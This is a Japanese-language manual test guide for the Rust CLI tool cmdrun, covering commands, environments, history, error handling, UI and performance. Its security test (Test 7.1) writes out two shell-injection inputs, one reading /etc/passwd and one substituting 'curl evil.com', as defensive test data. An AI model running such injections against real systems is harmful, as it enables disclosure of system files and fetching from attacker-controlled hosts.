# cmdrun 手動テストガイド

> **完璧な動作確認のための包括的手動テスト手順書**
>
> 自動テストでカバーできない対話的機能、UI/UX、実際のユーザー体験を検証

---

## 📋 テスト環境準備

### 前提条件チェックリスト

- [ ] Rust 1.80+ インストール済み
- [ ] `cargo build --release` でビルド成功
- [ ] テスト用の空ディレクトリを作成（例: `~/cmdrun-manual-test/`）
- [ ] 環境変数のバックアップ（テスト後に復元）

### セットアップ手順

```bash
# 1. ビルド
cd /path/to/cmdrun
cargo build --release

# 2. テスト環境作成
mkdir -p ~/cmdrun-manual-test
cd ~/cmdrun-manual-test

# 3. cmdrunをPATHに追加（一時的）
export PATH="/path/to/cmdrun/target/release:$PATH"

# 4. バージョン確認
cmdrun --version
```

**期待される出力:**
```
cmdrun 1.0.0
```

---

## 🧪 Test Suite 1: 基本コマンド操作

### Test 1.1: プロジェクト初期化

**目的:** `cmdrun init` コマンドの動作確認

**手順:**
```bash
cmdrun init
```

**期待される動作:**
- ✅ `commands.toml` ファイルが作成される
- ✅ 成功メッセージが表示される（例: "Created commands.toml in..."）
- ✅ ファイルに初期構造が含まれる（`[config]`, `[commands]`セクション）

**確認:**
```bash
cat commands.toml
```

**期待される内容:**
```toml
[config]
language = "en"
shell = "sh"

[commands]
# Add your commands here
```

**評価基準:**
- [ ] ファイルが正しく作成された
- [ ] TOMLフォーマットが有効
- [ ] コメントが適切

---

### Test 1.2: コマンド追加（対話的モード）

**目的:** 対話的プロンプトによるコマンド追加の動作確認

**手順:**
```bash
cmdrun add
```

**期待される動作:**
1. **Command ID プロンプト:**
   ```
   Command ID (e.g., build, test):
   ```
   - 入力: `my-build`

2. **Command プロンプト:**
   ```
   Command to execute:
   ```
   - 入力: `cargo build --release`

3. **Description プロンプト:**
   ```
   Description:
   ```
   - 入力: `Build the project in release mode`

4. **プレビュー表示:**
   ```
   Preview:
     ID: my-build
     Command: cargo build --release
     Description: Build the project in release mode

   What do you want to do?
   > Yes, add this command
     No, edit again
     Cancel
   ```
   - 選択: `Yes, add this command` (Enterキー)

**期待される結果:**
- ✅ 成功メッセージ表示（例: "✓ Added command 'my-build'"）
- ✅ `commands.toml` に追加される

**確認:**
```bash
cat commands.toml
```

**期待される内容:**
```toml
[commands.my-build]
description = "Build the project in release mode"
cmd = "cargo build --release"
```

**評価基準:**
- [ ] 対話的プロンプトが正しく機能
- [ ] 入力値が正確に反映される
- [ ] プレビュー表示が見やすい
- [ ] 確認フローがスムーズ

---

### Test 1.3: コマンド追加（非対話的モード）

**目的:** コマンドライン引数によるコマンド追加

**手順:**
```bash
cmdrun add my-test "cargo test" "Run all tests"
```

**期待される動作:**
- ✅ 対話的プロンプトなしで即座に追加
- ✅ 成功メッセージ表示

**確認:**
```bash
cmdrun list
```

**期待される出力:**
```
Available commands:

  • my-build - Build the project in release mode
  • my-test - Run all tests

💡 Use 'cmdrun run <command>' to execute
```

**評価基準:**
- [ ] 非対話的モードが正常動作
- [ ] 両方のコマンドがリストに表示
- [ ] 説明文が正しく表示

---

### Test 1.4: コマンド検索（部分一致）

**目的:** キーワード検索機能の動作確認

**手順:**
```bash
# 追加コマンドを準備
cmdrun add deploy "kubectl apply -f deployment.yaml" "Deploy to Kubernetes"
cmdrun add docker-build "docker build -t myapp ." "Build Docker image"

# 検索実行
cmdrun search build
```

**期待される出力:**
```
Searching for: 'build'

✓ Found 2 matching commands:

  • my-build - Build the project in release mode
    Matched in: id, command

  • docker-build - Build Docker image
    Matched in: id, description

💡 Use 'cmdrun info <command>' to see details
```

**評価基準:**
- [ ] 部分一致検索が機能
- [ ] マッチ箇所（id/description/command/tags）が表示
- [ ] 結果が見やすくフォーマットされている

---

### Test 1.5: コマンド実行

**目的:** 登録コマンドの実行確認

**手順:**
```bash
# 安全なテストコマンドを追加
cmdrun add hello "echo 'Hello, cmdrun!'" "Greeting command"

# 実行
cmdrun run hello
```

**期待される出力:**
```
Running: hello
Command: echo 'Hello, cmdrun!'

Hello, cmdrun!

✓ Completed in 0.01s
```

**評価基準:**
- [ ] コマンドが正常実行される
- [ ] 出力が正しく表示される
- [ ] 実行時間が表示される
- [ ] 終了ステータスが正しい

---

### Test 1.6: コマンド削除（確認あり）

**目的:** 削除確認プロンプトの動作確認

**手順:**
```bash
cmdrun remove hello
```

**期待される動作:**
1. **確認プロンプト:**
   ```
   Are you sure you want to remove command 'hello'? (y/N):
   ```
   - 入力: `y`

**期待される結果:**
- ✅ 成功メッセージ表示（例: "✓ Removed command 'hello'"）
- ✅ `cmdrun list` で削除確認

**評価基準:**
- [ ] 確認プロンプトが表示される
- [ ] `y` で削除、他で中止
- [ ] 削除後のリストに表示されない

---

### Test 1.7: コマンド削除（強制モード）

**目的:** `--force` フラグによる即時削除

**手順:**
```bash
cmdrun add temp "echo temp" "Temporary command"
cmdrun remove temp --force
```

**期待される動作:**
- ✅ 確認プロンプトなしで即座に削除
- ✅ 成功メッセージ表示

**評価基準:**
- [ ] 確認なしで削除される
- [ ] エラーなく完了

---

## 🧪 Test Suite 2: 環境管理

### Test 2.1: 環境作成

**目的:** 新しい環境の作成機能確認

**手順:**
```bash
cmdrun env create dev "Development environment"
```

**期待される出力:**
```
✓ Created environment: dev - Development environment
```

**確認:**
```bash
cmdrun env list
```

**期待される出力:**
```
Available environments:

  → default - Default environment
    dev - Development environment

💡 Use 'cmdrun env use <env>' to switch
```

**評価基準:**
- [ ] 環境が正しく作成される
- [ ] リストに表示される
- [ ] 現在の環境マーカー（→）が正確

---

### Test 2.2: 環境切り替え

**目的:** 環境スイッチング機能の確認

**手順:**
```bash
# stagingとprod環境を追加作成
cmdrun env create staging "Staging environment"
cmdrun env create prod "Production environment"

# stagingに切り替え
cmdrun env use staging
```

**期待される出力:**
```
✓ Switched to environment: staging
```

**確認:**
```bash
cmdrun env current
```

**期待される出力:**
```
Current environment:
  staging
```

**確認2:**
```bash
cmdrun env list
```

**期待される出力:**
```
Available environments:

    default - Default environment
    dev - Development environment
  → staging - Staging environment
    prod - Production environment
```

**評価基準:**
- [ ] 環境切り替えが成功
- [ ] `env current` が正しい環境を表示
- [ ] マーカーが移動している

---

### Test 2.3: 環境変数設定

**目的:** 環境別の変数設定機能確認

**手順:**
```bash
# dev環境に変数設定
cmdrun env use dev
cmdrun env set API_URL "http://localhost:3000"
cmdrun env set DB_HOST "localhost"

# prod環境に変数設定
cmdrun env use prod
cmdrun env set API_URL "https://api.example.com"
cmdrun env set DB_HOST "prod-db.example.com"
```

**期待される出力（各set実行時）:**
```
✓ Set API_URL=http://localhost:3000 in environment 'dev'
✓ Set DB_HOST=localhost in environment 'dev'
✓ Set API_URL=https://api.example.com in environment 'prod'
✓ Set DB_HOST=prod-db.example.com in environment 'prod'
```

**確認:**
```bash
# dev環境の変数確認
cmdrun env use dev
cmdrun env info
```

**期待される出力:**
```
Environment: dev

  Description: Development environment

  Environment variables:
    API_URL = http://localhost:3000
    DB_HOST = localhost

  Configuration files:
    Base config: commands.toml
    Environment config: commands.dev.toml (not found)
```

**確認2:**
```bash
# prod環境の変数確認
cmdrun env use prod
cmdrun env info
```

**期待される出力:**
```
Environment: prod

  Description: Production environment

  Environment variables:
    API_URL = https://api.example.com
    DB_HOST = prod-db.example.com

  Configuration files:
    Base config: commands.toml
    Environment config: commands.prod.toml (not found)
```

**評価基準:**
- [ ] 各環境に独立して変数が設定される
- [ ] 環境切り替えで変数が正しく分離される
- [ ] `env info` で変数が正しく表示される

---

### Test 2.4: 環境情報表示

**目的:** 環境の詳細情報表示機能確認

**手順:**
```bash
# デフォルト環境の情報
cmdrun env use default
cmdrun env info

# 特定環境の情報（現在の環境以外）
cmdrun env info dev
```

**期待される出力（default）:**
```
Environment: default

  Description: Default environment

  Configuration files:
    Base config: commands.toml
```

**期待される出力（dev）:**
```
Environment: dev

  Description: Development environment

  Environment variables:
    API_URL = http://localhost:3000
    DB_HOST = localhost

  Configuration files:
    Base config: commands.toml
    Environment config: commands.dev.toml (not found)
```

**評価基準:**
- [ ] デフォルト環境が正しく表示
- [ ] 他環境を指定しても情報が取得できる
- [ ] 設定ファイルパスが正確

---

## 🧪 Test Suite 3: 履歴管理

### Test 3.1: 履歴記録

**目的:** コマンド実行履歴の記録確認

**手順:**
```bash
# いくつかのコマンドを実行
cmdrun run my-build
cmdrun run my-test
cmdrun run deploy
```

**確認:**
```bash
cmdrun history
```

**期待される出力:**
```
Command Execution History

✓ #3 deploy success
  Time: 2025-01-12 10:45:23
  Duration: 2.34s

✓ #2 my-test success
  Time: 2025-01-12 10:44:15
  Duration: 5.67s

✓ #1 my-build success
  Time: 2025-01-12 10:43:01
  Duration: 12.34s

ℹ Showing 3 entries
```

**評価基準:**
- [ ] 実行履歴が正しく記録される
- [ ] 成功/失敗ステータスが表示
- [ ] 実行時刻と所要時間が記録
- [ ] 逆時系列（新しいものが上）

---

### Test 3.2: 履歴検索

**目的:** 履歴のキーワード検索確認

**手順:**
```bash
cmdrun history search build
```

**期待される出力:**
```
🔍 Searching for: build

✓ Found 1 matching entries

✓ #1 my-build success
  Time: 2025-01-12 10:43:01
  Duration: 12.34s
```

**評価基準:**
- [ ] キーワード検索が機能
- [ ] マッチしたエントリのみ表示
- [ ] 詳細情報が保持されている

---

### Test 3.3: 失敗コマンドのみ表示

**目的:** `--failed` フラグによるフィルタリング確認

**手順:**
```bash
# わざと失敗するコマンドを実行
cmdrun add fail-cmd "exit 1" "Command that fails"
cmdrun run fail-cmd

# 失敗コマンドのみ表示
cmdrun history --failed
```

**期待される出力:**
```
Command Execution History

✗ #4 fail-cmd failed
  Time: 2025-01-12 10:50:00
  Duration: 0.01s
  Exit code: 1

ℹ Showing 1 entries
```

**評価基準:**
- [ ] 失敗コマンドのみが表示される
- [ ] 成功コマンドは表示されない
- [ ] exit codeが正しく記録

---

### Test 3.4: 履歴統計表示

**目的:** 統計情報の表示確認

**手順:**
```bash
cmdrun history --stats
```

**期待される出力:**
```
History Statistics

  Total commands: 4
  Successful: 3
  Failed: 1
  Success rate: 75.0%
  Avg duration: 5.09s
```

**評価基準:**
- [ ] 合計数が正確
- [ ] 成功/失敗数が正確
- [ ] 成功率が正しく計算される
- [ ] 平均実行時間が計算される

---

### Test 3.5: 履歴エクスポート（JSON）

**目的:** JSON形式でのエクスポート確認

**手順:**
```bash
cmdrun history export --format json --output history.json
```

**期待される出力:**
```
✓ Exported history to: history.json
```

**確認:**
```bash
cat history.json | python -m json.tool | head -20
```

**期待される内容:**
```json
[
  {
    "id": 4,
    "command": "fail-cmd",
    "success": false,
    "exit_code": 1,
    "duration_ms": 10,
    "start_time": 1705048200000,
    "working_dir": "/home/user/cmdrun-manual-test",
    "environment": "default"
  },
  ...
]
```

**評価基準:**
- [ ] JSONファイルが作成される
- [ ] 有効なJSON形式
- [ ] 全履歴が含まれる
- [ ] フィールドが完全

---

### Test 3.6: 履歴エクスポート（CSV）

**目的:** CSV形式でのエクスポート確認

**手順:**
```bash
cmdrun history export --format csv --output history.csv
```

**確認:**
```bash
head -5 history.csv
```

**期待される内容:**
```csv
id,command,success,exit_code,duration_ms,start_time,working_dir,environment
4,fail-cmd,false,1,10,1705048200000,/home/user/cmdrun-manual-test,default
3,deploy,true,0,2340,1705048123000,/home/user/cmdrun-manual-test,default
2,my-test,true,0,5670,1705048055000,/home/user/cmdrun-manual-test,default
1,my-build,true,0,12340,1705047981000,/home/user/cmdrun-manual-test,default
```

**評価基準:**
- [ ] CSVファイルが作成される
- [ ] ヘッダー行が含まれる
- [ ] データが正しくエスケープされる

---

### Test 3.7: 履歴クリア

**目的:** 履歴削除機能の確認

**手順:**
```bash
cmdrun history clear
```

**期待される動作:**
1. **確認プロンプト:**
   ```
   Are you sure you want to clear all history? (y/N):
   ```
   - 入力: `y`

**期待される出力:**
```
✓ Cleared 4 history entries
```

**確認:**
```bash
cmdrun history
```

**期待される出力:**
```
No history entries found
```

**評価基準:**
- [ ] 確認プロンプトが表示される
- [ ] クリア件数が正確
- [ ] 履歴が完全に削除される

---

## 🧪 Test Suite 4: エラーハンドリング

### Test 4.1: 無効なコマンド実行

**目的:** 存在しないコマンドの実行時のエラー処理確認

**手順:**
```bash
cmdrun run nonexistent-command
```

**期待される出力:**
```
Error: Command 'nonexistent-command' not found

💡 Use 'cmdrun list' to see available commands
```

**評価基準:**
- [ ] エラーメッセージが明確
- [ ] ヒントメッセージが表示される
- [ ] exit codeが0以外

---

### Test 4.2: 重複コマンド追加

**目的:** 既存コマンドID使用時のエラー処理確認

**手順:**
```bash
cmdrun add my-build "cargo build" "Duplicate ID test"
```

**期待される出力:**
```
Error: Command 'my-build' already exists

💡 Use 'cmdrun remove my-build' to remove it first, or choose a different ID
```

**評価基準:**
- [ ] 重複が検出される
- [ ] 適切なエラーメッセージ
- [ ] 解決策のヒント表示

---

### Test 4.3: 無効なTOMLファイル

**目的:** 破損した設定ファイルの処理確認

**手順:**
```bash
# TOMLファイルを意図的に破損
echo "invalid toml syntax {{{" >> commands.toml

# コマンド実行試行
cmdrun list
```

**期待される出力:**
```
Error: Failed to parse configuration file: commands.toml

Details: TOML parse error at line 15, column 1
  |
15| invalid toml syntax {{{
  | ^
expected `.`, `=`

💡 Check your commands.toml file for syntax errors
```

**後処理:**
```bash
# 修復（初期化し直す）
rm commands.toml
cmdrun init
```

**評価基準:**
- [ ] パースエラーが検出される
- [ ] 行番号・カラム番号が表示される
- [ ] エラー箇所が明確

---

### Test 4.4: 環境切り替えエラー

**目的:** 存在しない環境への切り替え時のエラー処理

**手順:**
```bash
cmdrun env use nonexistent-env
```

**期待される出力:**
```
Error: Environment 'nonexistent-env' not found

Available environments:
  - default
  - dev
  - staging
  - prod

💡 Use 'cmdrun env create <name>' to create a new environment
```

**評価基準:**
- [ ] エラーが適切に報告される
- [ ] 利用可能な環境リストが表示される
- [ ] 作成方法のヒント表示

---

## 🧪 Test Suite 5: UI/UX評価

### Test 5.1: ヘルプメッセージ

**目的:** ヘルプの可読性・有用性確認

**手順:**
```bash
cmdrun --help
cmdrun add --help
cmdrun env --help
cmdrun history --help
```

**評価基準:**
- [ ] サブコマンドが全てリストされる
- [ ] 各オプションの説明が明確
- [ ] 使用例が含まれる
- [ ] フォーマットが見やすい

---

### Test 5.2: カラー出力

**目的:** ターミナルカラー対応の確認

**手順:**
```bash
# カラー出力を確認
cmdrun list
cmdrun history
```

**評価基準:**
- [ ] 成功メッセージが緑色（✓）
- [ ] エラーメッセージが赤色（✗）
- [ ] 警告メッセージが黄色（⚠）
- [ ] コマンド名が強調表示される

---

### Test 5.3: 日本語対応

**目的:** 国際化（i18n）機能の確認

**手順:**
```bash
# 設定ファイルを編集
# commands.toml の [config] セクションを変更:
# language = "ja"

# 日本語メッセージ確認
cmdrun list
cmdrun add
```

**期待される動作:**
- ✅ メッセージが日本語で表示される

**評価基準:**
- [ ] 言語切り替えが機能
- [ ] 翻訳が自然
- [ ] 全てのメッセージが翻訳されている

---

## 🧪 Test Suite 6: パフォーマンス確認

### Test 6.1: 起動時間計測

**目的:** コールドスタート時のパフォーマンス確認

**手順:**
```bash
# 起動時間計測（10回平均）
for i in {1..10}; do
  time cmdrun --version > /dev/null
done
```

**期待される結果:**
- ✅ 平均起動時間が10ms以下
- ✅ 最悪ケースでも50ms以下

**評価基準:**
- [ ] 起動が高速
- [ ] バラつきが小さい

---

### Test 6.2: 大量コマンド処理

**目的:** スケーラビリティの確認

**手順:**
```bash
# 1000個のコマンドを追加（スクリプト使用）
for i in {1..1000}; do
  cmdrun add "cmd$i" "echo $i" "Command $i"
done

# リスト表示時間計測
time cmdrun list > /dev/null
```

**期待される結果:**
- ✅ リスト表示が1秒以内
- ✅ メモリ使用量が100MB以下

**評価基準:**
- [ ] 大量データでも動作する
- [ ] レスポンスが許容範囲

---

## 🧪 Test Suite 7: セキュリティ検証

### Test 7.1: シェルインジェクション対策

**目的:** 危険なコマンド入力の検証確認

**手順:**
```bash
# 危険なコマンド例
cmdrun add dangerous "; cat /etc/passwd" "Injection test"
cmdrun add dangerous2 "\$(curl evil.com)" "Command substitution test"
```

**期待される動作:**
- ✅ 警告メッセージが表示される（または追加が拒否される）
- ✅ 実行時に適切にエスケープされる

**評価基準:**
- [ ] セキュリティ警告が表示される
- [ ] 実行時に意図しないコマンドが実行されない

---

## 📊 テスト結果記録テンプレート

### テスト実施記録

**テスト実施日:** YYYY-MM-DD
**テスター:** [Your Name]
**cmdrun バージョン:** 1.0.0
**OS環境:** [OS Name and Version]
**Rust バージョン:** [Rust Version]

### 総合評価

| Test Suite | 合格 | 失敗 | スキップ | 備考 |
|-----------|------|------|----------|------|
| Suite 1: 基本コマンド操作 | □ | □ | □ | |
| Suite 2: 環境管理 | □ | □ | □ | |
| Suite 3: 履歴管理 | □ | □ | □ | |
| Suite 4: エラーハンドリング | □ | □ | □ | |
| Suite 5: UI/UX評価 | □ | □ | □ | |
| Suite 6: パフォーマンス確認 | □ | □ | □ | |
| Suite 7: セキュリティ検証 | □ | □ | □ | |

### 検出された問題

| 重要度 | 問題内容 | 再現手順 | 期待される動作 | 実際の動作 |
|--------|----------|----------|----------------|-----------|
| 高/中/低 | | | | |

### 総合所見

[テスト全体の印象、改善提案、その他のコメント]

---

## 🔧 クリーンアップ手順

テスト完了後の環境クリーンアップ：

```bash
# 1. テストディレクトリ削除
cd ~
rm -rf ~/cmdrun-manual-test

# 2. 環境変数復元（必要に応じて）
unset CMDRUN_HISTORY_DB

# 3. PATH復元（.bashrc/.zshrc等の変更があれば元に戻す）
```

---

## 📚 参考資料

- [cmdrun README](../README.md)
- [自動テストスイート](../tests/comprehensive_behavior_test.rs)
- [ユーザーガイド](../docs/user-guide/)
- [技術文書](../docs/technical/)

---

**© 2025 cmdrun Project - MIT License**
